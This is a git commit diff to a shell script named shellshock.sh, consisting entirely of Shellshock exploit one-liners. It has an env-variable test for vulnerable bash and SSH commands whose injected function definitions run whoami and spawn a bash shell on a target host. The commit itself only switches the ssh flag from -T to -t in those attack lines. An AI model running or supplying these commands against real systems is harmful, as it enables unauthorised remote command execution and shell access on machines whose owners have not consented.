a66ae7ccf31c5bf1eda2fc552995bfab1edf8ea8
DeanDevel <97833014+DeanDevel@users.noreply.github.com>
2022-10-13 19:29:31 +0200

    Update shellshock.sh

--- shellshock.sh
+++ shellshock.sh
@@ -2,7 +2,7 @@
 env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
 
 # executing arbitrary commands by exploiting SSH via shellshock
-ssh user@192.168.0.1 -T '() { :;}; whoami'
+ssh user@192.168.0.1 -t '() { :;}; whoami'
 
 # spwan bash shell by exploiting SSH via shellshock
-ssh user@192.168.0.1 -T '() { :;}; /bin/bash'
+ssh user@192.168.0.1 -t '() { :;}; /bin/bash'
